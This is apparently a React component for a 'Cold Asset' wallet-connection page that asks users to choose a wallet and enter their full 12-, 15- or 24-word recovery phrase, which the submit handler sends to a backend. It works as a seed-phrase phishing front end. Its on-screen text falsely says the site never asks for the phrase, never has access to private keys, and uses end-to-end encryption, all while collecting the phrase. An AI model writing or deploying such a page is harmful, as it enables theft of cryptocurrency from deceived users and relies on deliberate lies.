import { useState } from 'react';
import { useNavigate } from '@tanstack/react-router';
import { cn } from "@/lib/utils";
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'react-fox-toast';

// Hooks and Utils
import { useConnectWallet } from '@/services/mutations.service';
import { normalizePhrase } from '@/utils/format';

// Components
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";

// Icons
import { ChevronRight, AlertCircle, CheckCircle2, Loader2, Shield, Lock } from 'lucide-react';
import { Wallet1 } from 'iconsax-reactjs';

const POPULAR_WALLETS = [
    { id: 'metamask', name: 'MetaMask', logo: "/companies/metamask.png" },
    { id: 'trust', name: 'Trust Wallet', logo: "/companies/trustwallet.png" },
    { id: 'phantom', name: 'Phantom', logo: "/companies/phantom.png" },
    { id: 'ledger', name: 'Ledger', logo: "/companies/ledger.png" },
    { id: 'exodus', name: 'Exodus', logo: "/companies/exodus.png" },
    { id: 'coinbase', name: 'Coinbase Wallet', logo: "/companies/coinbase.png" },
    { id: 'other', name: 'Other Wallet', logo: "/companies/wallet.png" }
];

const PHRASE_LENGTHS = [12, 15, 24];

export default function Wallet({ connected = false, connectedWalletName = 'MetaMask' }) {

    const navigate = useNavigate();
    const [step, setStep] = useState('select');
    const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
    const [customWalletName, setCustomWalletName] = useState('');
    const [phrase, setPhrase] = useState('');
    const [errors, setErrors] = useState<{ wallet?: string, phrase?: string }>({});

    const handleWalletSelect = (walletId: string) => {
        setSelectedWallet(walletId);
        setErrors({});

        if (walletId !== 'other') {
            setCustomWalletName('');
        }
    };

    const handleContinueToPhrase = () => {
        if (selectedWallet === 'other' && !customWalletName.trim()) {
            setErrors({ wallet: 'Please enter your wallet name' });
            return;
        }
        setStep('phrase');
    };


    const validatePhrase = (phraseText: string): boolean => {
        const words = normalizePhrase(phraseText);
        return PHRASE_LENGTHS.includes(words.length);
    };

    const connectWallet = useConnectWallet()
    const handleSubmit = async () => {
        const newErrors: Record<string, string> = {};

        if (!phrase.trim()) {
            newErrors.phrase = "Please enter your recovery phrase";
        } else if (!validatePhrase(phrase)) {
            newErrors.phrase = "Recovery phrase must be 12, 15, or 24 words";
        }

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors);
            return;
        }

        const phraseArray = normalizePhrase(phrase);

        const formData = {
            wallet: selectedWallet === "other" ? customWalletName : POPULAR_WALLETS.find((w) => w.id === selectedWallet)?.name ?? "None",
            passPhrase: phraseArray,
        };

        connectWallet.mutate(formData, {
            onSuccess: (response) => {
                toast.success(
                    response.message ||
                    "Your wallet connect was initiated successfully!"
                );
            },
            onError: (error: any) => {
                const message =
                    error?.response?.data?.message ||
                    "Sorry, we couldn't initiate your wallet connection now.";
                toast.error(message);
            },
        });
    };

    const getWalletName = () => {
        if (selectedWallet === 'other') {
            return customWalletName;
        }
        return POPULAR_WALLETS.find(w => w.id === selectedWallet)?.name;
    };

    const phraseWordCount = phrase.trim().split(/\s+/).filter(w => w.length > 0).length;

    // Connected State UI
    if (connected) {
        return (
            <div className="relative mt-10 overflow-hidden">
                <div className="relative mx-auto max-w-6xl">
                    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mb-8 text-center">
                        <div className="inline-flex relative justify-center items-center bg-linear-to-br from-green-500 to-emerald-500 mb-6 rounded-3xl size-16 md:size-18 xl:size-20">
                            <Loader2 className="size-8 md:size-9 xl:size-10 text-white animate-spin" />
                        </div>

                        <h1 className="font-bold text-foreground text-2xl md:text-3xl xl::text-4xl">
                            Connection Pending
                        </h1>

                        <p className="mb-6 text-muted-foreground text-sm md:text-base xl:text-lg">
                            Your wallet connection request is being processed
                        </p>

                        <Badge className="bg-green-500 shadow-lg px-4 py-2 text-white">
                            <CheckCircle2 className="mr-2 size-6" />
                            {connectedWalletName} Connected
                        </Badge>
                    </motion.div>

                    <Card className="border-border">
                        <CardContent className="p-4 md:p-6 xl:p-8 text-center">
                            <div className="space-y-6">
                                <div className="flex justify-center items-center gap-3 text-muted-foreground">
                                    <div className="bg-green-500 rounded-full size-2 animate-pulse" />
                                    <span className="text-[11px] md:text-xs xl:text-sm">Processing your connection request...</span>
                                </div>

                                <div className="bg-green-50 dark:bg-green-950/20 p-4 border border-green-500/30 rounded-xl">
                                    <p className="text-[11px] text-green-800 dark:text-green-200 md:text-xs xl:text-sm">
                                        Please wait while we securely connect your <span className="font-bold">{connectedWalletName}</span> wallet to Cold Asset. This may take a few moments.
                                    </p>
                                </div>

                                <div className="pt-4 border-border border-t">
                                    <div className="flex justify-center items-center gap-2 text-muted-foreground text-xs">
                                        <Shield className="size-4" />
                                        <span>Secured with end-to-end encryption</span>
                                    </div>
                                </div>
                            </div>
                        </CardContent>
                    </Card>
                </div>
            </div>
        );
    }

    return (
        <main>
            <div className="mx-auto max-w-6xl">
                {/* Header */}
                <motion.div initial={{ opacity: 0, y: -20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="mb-10 text-center">
                    <div className="inline-flex justify-center items-center bg-primary mb-4 rounded-2xl size-12 md:size-14 xl:size-16">
                        <Wallet1 className="size-6 md:size-7 xl:size-8 text-white" />
                    </div>

                    <h1 className="mb-2 font-bold text-foreground text-2xl md:text-3xl xl:text-4xl">
                        Connect Wallet
                    </h1>

                    <p className="text-muted-foreground">
                        {step === 'select' ? 'Choose your wallet to get started' : 'Enter your recovery phrase'}
                    </p>
                </motion.div>

                <AnimatePresence mode="wait">
                    {/* Step 1: Select Wallet */}
                    {step === 'select' && (
                        <motion.div key="select" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.3 }}>
                            <Card className="border-border">
                                <CardHeader className="border-border/50 border-b">
                                    <CardTitle>Select Your Wallet</CardTitle>
                                </CardHeader>
                                <CardContent className="p-4 md:p-5 xl:p-6">
                                    <div className="gap-3 grid sm:grid-cols-2 mb-6">
                                        {POPULAR_WALLETS.map((wallet, index) => (
                                            <motion.div key={wallet.id} initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: index * 0.05 }}>
                                                <button
                                                    onClick={() => handleWalletSelect(wallet.id)}
                                                    className={cn(
                                                        "p-4 border-2 rounded-xl w-full transition-all duration-200 cursor-pointer",
                                                        "hover:shadow-lg hover:scale-[1.02] active:scale-[0.98]",
                                                        "flex items-center justify-between group",
                                                        selectedWallet === wallet.id
                                                            ? "border-primary bg-primary/5 shadow-lg shadow-primary/10"
                                                            : "border-border hover:border-primary/50"
                                                    )}>
                                                    <div className="flex items-center gap-3">
                                                        <img src={wallet.logo} alt={wallet.name + " logo"} className='w-6' />
                                                        <span className="font-semibold text-foreground">{wallet.name}</span>
                                                    </div>
                                                    {selectedWallet === wallet.id && (
                                                        <CheckCircle2 className="size-5 text-primary" />
                                                    )}
                                                </button>
                                            </motion.div>
                                        ))}
                                    </div>

                                    {/* Custom Wallet Input */}
                                    <AnimatePresence>
                                        {selectedWallet === 'other' && (
                                            <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} exit={{ opacity: 0, height: 0 }} className="mb-6">
                                                <Label htmlFor="customWallet" className="block mb-2 font-semibold text-[11px] md:text-xs xl:text-sm">
                                                    Wallet Name
                                                </Label>
                                                <Input id="customWallet" placeholder="Enter your wallet name" value={customWalletName}
                                                    onChange={(e) => {
                                                        setCustomWalletName(e.target.value);
                                                        if (errors.wallet) setErrors({});
                                                    }}
                                                    className={cn(
                                                        "h-8 md:h-10 xl:h-12",
                                                        errors.wallet && "border-red-500"
                                                    )}
                                                />
                                                {errors.wallet && (
                                                    <p className="flex items-center gap-1 mt-2 text-[11px] text-red-500 md:text-xs xl:text-sm">
                                                        <AlertCircle className="size-3" />
                                                        {errors.wallet}
                                                    </p>
                                                )}
                                            </motion.div>
                                        )}
                                    </AnimatePresence>

                                    <Button onClick={handleContinueToPhrase} disabled={!selectedWallet} className="hover:shadow-lg w-full h-8 md:h-10 xl:h-12">
                                        Continue
                                        <ChevronRight className="ml-2 size-5" />
                                    </Button>
                                </CardContent>
                            </Card>
                        </motion.div>
                    )}

                    {/* Step 2: Enter Phrase */}
                    {step === 'phrase' && (
                        <motion.div key="phrase" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.3 }}>
                            <Card className="border-border">
                                <CardHeader className="border-border/50 border-b">
                                    <div className="flex justify-between items-center">
                                        <div>
                                            <CardTitle className="mb-1">Recovery Phrase</CardTitle>
                                            <p className="text-[11px] text-muted-foreground md:text-xs xl:text-sm">
                                                For <span className="font-semibold text-foreground">{getWalletName()}</span>
                                            </p>
                                        </div>
                                        <Button variant="ghost" size="sm" onClick={() => setStep('select')}>
                                            Change
                                        </Button>
                                    </div>
                                </CardHeader>
                                <CardContent className="p-4 md:p-5 xl:p-6">
                                    <section className="space-y-6">
                                        {/* Security Notice */}
                                        <div className="bg-amber-50/50 dark:bg-amber-950/20 p-4 border border-amber-500/30 rounded-xl">
                                            <div className="flex items-start gap-3">
                                                <Lock className="mt-0.5 size-5 text-amber-600 shrink-0" />
                                                <div className="text-[11px] text-amber-800 dark:text-amber-200 md:text-xs xl:text-sm">
                                                    <p className="mb-1 font-semibold">Keep your phrase secure</p>
                                                    <p className="text-[10px] text-amber-700 md:text-[11px] dark:text-amber-300 xl:text-xs">
                                                        Never share your recovery phrase with anyone. Cold Asset will never ask for it.
                                                    </p>
                                                </div>
                                            </div>
                                        </div>

                                        {/* Phrase Input */}
                                        <div className="space-y-2">
                                            <div className="flex justify-between items-center">
                                                <Label htmlFor="phrase" className="font-semibold text-[11px] md:text-xs xl:text-sm">
                                                    Enter your recovery phrase
                                                </Label>
                                                <div className="flex items-center gap-2">
                                                    {PHRASE_LENGTHS.map(length => (
                                                        <Badge key={length} variant={phraseWordCount === length ? "default" : "outline"}
                                                            className={cn(
                                                                "text-xs", phraseWordCount === length && "bg-green-500")}>
                                                            {length}
                                                        </Badge>
                                                    ))}
                                                </div>
                                            </div>
                                            <textarea id="phrase" placeholder="Enter your 12, 15, or 24 word recovery phrase separated by spaces" value={phrase}
                                                onChange={(e) => {
                                                    setPhrase(e.target.value);
                                                    if (errors.phrase) setErrors({});
                                                }}
                                                className={cn("bg-background p-4 border rounded-lg w-full min-h-40", "focus:outline-none focus:ring-2 focus:ring-primary font-mono text-[11px] md:text-xs xl:text-sm", "resize-none",
                                                    errors.phrase ? "border-red-500 focus:ring-red-500" : "border-input"
                                                )} />
                                            {phraseWordCount > 0 && (
                                                <p className="text-[10px] text-muted-foreground md:text-[11px] xl:text-xs">
                                                    {phraseWordCount} word{phraseWordCount !== 1 ? 's' : ''} entered
                                                </p>
                                            )}
                                            {errors.phrase && (
                                                <p className="flex items-center gap-1 text-[11px] text-red-500 md:text-xs xl:text-sm">
                                                    <AlertCircle className="size-3" />
                                                    {errors.phrase}
                                                </p>
                                            )}
                                        </div>

                                        {/* Submit Button */}
                                        <Button onClick={handleSubmit} disabled={connectWallet.isPending || phraseWordCount === 0} className="hover:shadow-lg w-full h-8 md:h-10 xl:h-12">
                                            {connectWallet.isPending ? (
                                                <>
                                                    <Loader2 className="mr-2 size-4 animate-spin" />
                                                    Connecting Wallet...
                                                </>
                                            ) : (
                                                <>
                                                    Connect Wallet
                                                    <ChevronRight className="ml-2 size-5" />
                                                </>
                                            )}
                                        </Button>
                                    </section>
                                </CardContent>
                            </Card>
                        </motion.div>
                    )}

                    {/* Step 3: Success */}
                    {step === 'submitted' && (
                        <motion.div key="submitted" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.4 }} className="text-center">
                            <Card className="border-border">
                                <CardContent className="p-4 md:p-6 xl:p-8">
                                    <div className="inline-flex justify-center items-center bg-green-500/10 mb-6 rounded-full size-16 md:size-18 xl:size-20">
                                        <CheckCircle2 className="size-8 md:size-9 xl:size-10 text-green-600" />
                                    </div>

                                    <h2 className="mb-3 font-bold text-foreground text-xl md:text-2xl xl:text-3xl">
                                        Wallet Connected!
                                    </h2>

                                    <p className="mb-8 text-muted-foreground">
                                        Your <span className="font-semibold text-foreground">{getWalletName()}</span> wallet has been successfully connected to Cold Asset.
                                    </p>

                                    <Button onClick={() => navigate({ to: "/dashboard" })} className="bg-linear-to-r from-indigo-500 to-purple-500 text-white">
                                        Go to Dashboard
                                    </Button>
                                </CardContent>
                            </Card>
                        </motion.div>
                    )}
                </AnimatePresence>

                {/* Info Card */}
                {step !== 'submitted' && (
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }} className="mt-4">
                        <Card className="bg-accent/30 border-border/50">
                            <CardContent className="p-4">
                                <div className="flex items-start gap-3">
                                    <Shield className="mt-0.5 size-5 text-primary shrink-0" />
                                    <div className="text-[11px] text-muted-foreground md:text-xs xl:text-sm">
                                        <p className="mb-1 font-semibold text-foreground">Your keys, your crypto</p>
                                        <p>Your recovery phrase is encrypted and stored securely. We never have access to your private keys.</p>
                                    </div>
                                </div>
                            </CardContent>
                        </Card>
                    </motion.div>
                )}
            </div>
        </main>
    );
}